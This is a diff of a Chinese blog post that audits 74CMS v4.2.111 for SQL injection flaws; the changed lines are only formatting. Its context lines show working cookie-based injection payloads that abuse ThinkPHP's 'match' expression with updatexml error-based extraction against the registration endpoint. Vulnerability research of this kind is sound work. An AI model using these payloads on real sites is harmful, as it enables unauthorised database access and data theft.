@@ -102,7 +102,7 @@
 <meta property="og:image" content="http://static.zybuluo.com/chhyx/lxggkw9182tcrh3fb46vh5rb/image_1cp8u762a1mms1buc1l2bc851a4deg.png">
 <meta property="og:image" content="http://static.zybuluo.com/chhyx/02de6ocyv7r4dhob382abr8l/image_1cp8ufiq5u431rsd1p1a3j11sjjet.png">
 <meta property="og:image" content="http://static.zybuluo.com/chhyx/d2hpvua1m2jag632czdjhj3k/image_1cp903p10259b6p17d011omemhfa.png">
-<meta property="og:updated_time" content="2018-10-08T12:49:24.217Z">
+<meta property="og:updated_time" content="2018-10-08T12:52:14.232Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="代码审计 | 74CMS_V4.2.111多处sql注入">
 <meta name="twitter:description" content="漏洞的大致思路: 1.找到think_filter()漏掉的表达式match 2.搜索用到where的参数可控的函数  a.get post cookie header等接收的参数  b.函数直接接收的参数 如  public function($id) 3.用表达式构造sql语句  ##基础知识:总结一下在拿到一个基于TP框架开发的cms 审计流程是怎样的这里以74cm最新版本74cms_Hom">
@@ -391,7 +391,7 @@ public function company_focus($company_id){
     $r = D(&apos;PersonalFocusCompany&apos;)-&gt;add_focus($company_id,C(&apos;visitor.uid&apos;));
     $this-&gt;ajaxReturn($r[&apos;state&apos;],$r[&apos;msg&apos;],$r[&apos;data&apos;]);
 }
-</code></pre><p>跟进add_focus()函数:<br><img src="http://static.zybuluo.com/chhyx/9hfa3dlxobcwng3xz5r7kkn0/image_1cp8q661n1lqaeh516sebh1bqp2p.png" alt="image_1cp8q661n1lqaeh516sebh1bqp2p.png-68.2kB"></p>
+</code></pre><p>跟进<code>add_focus()</code>函数:<br><img src="http://static.zybuluo.com/chhyx/9hfa3dlxobcwng3xz5r7kkn0/image_1cp8q661n1lqaeh516sebh1bqp2p.png" alt="image_1cp8q661n1lqaeh516sebh1bqp2p.png-68.2kB"></p>
 <p><img src="http://static.zybuluo.com/chhyx/605l40sydht50z29duok12zn/image_1cp8qpd2bf871bsa10431083p54d3.png" alt="image_1cp8qpd2bf871bsa10431083p54d3.png-310.8kB"></p>
 <p>2.<code>upload\Application\Home\Controller\CompanyServiceController.class.php</code></p>
 <pre><code>$order = D(&apos;Order&apos;)-&gt;where(array(&apos;id&apos;=&gt;$order_id))-&gt;find();
@@ -432,7 +432,7 @@ public function register(){
 b.bind&apos; == $ucenter
 c.$data[&apos;reg_type&apos;] == 1 &amp;&amp; $data[&apos;utype&apos;] ==2
 d.$data[&apos;unbind_mobile&apos;] 存在
-</code></pre><p>这里的漏洞参数$data[‘mobile’] 是可控的<br>虽然$data[‘mobile’]是I函数取值的,但是在下面<code>$data = array_merge($data,$uc_user);</code> 对cookie接收的参数进行了合并,这样我们就可以利用cookie方式来传递我们的sql语句来进行注入</p>
+</code></pre><p>这里的漏洞参数<code>$data[&#39;mobile&#39;]</code> 是可控的<br>虽然<code>$data[&#39;mobile&#39;]</code>是I函数取值的,但是在下面<code>$data = array_merge($data,$uc_user);</code> 对<code>cookie</code>接收的参数进行了合并,这样我们就可以利用<code>cookie</code>方式来传递我们的sql语句来进行注入</p>
 <p>payload分析:</p>
 <pre><code>url:http://127.0.0.1:84/index.php?m=Home&amp;c=Members&amp;a=register
 POST：ucenter=bind&amp;utype=2&amp;reg_type=1&amp;unbind_mobile=1 //满足bcd
@@ -472,7 +472,7 @@ Cookie: members_uc_info[mobile][0]=match; members_uc_info[mobile][16][0]=aa&quot
 Cookie: members_bind_info[type][0]=match; members_bind_info[type][19][0]=aa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a
 
 POST: username=test1&amp;password=test1  //注册账户 用户名:test1       密码:test1
-</code></pre><p>这里的$user_bind_info是用cookie方式直接传过来的 我们可控导致注入产生:<br><img src="http://static.zybuluo.com/chhyx/d2hpvua1m2jag632czdjhj3k/image_1cp903p10259b6p17d011omemhfa.png" alt="image_1cp903p10259b6p17d011omemhfa.png-92.9kB"></p>
+</code></pre><p>这里的<code>$user_bind_info</code>是用<code>cookie</code>方式直接传过来的 我们可控导致注入产生:<br><img src="http://static.zybuluo.com/chhyx/d2hpvua1m2jag632czdjhj3k/image_1cp903p10259b6p17d011omemhfa.png" alt="image_1cp903p10259b6p17d011omemhfa.png-92.9kB"></p>
 
       
     </div>
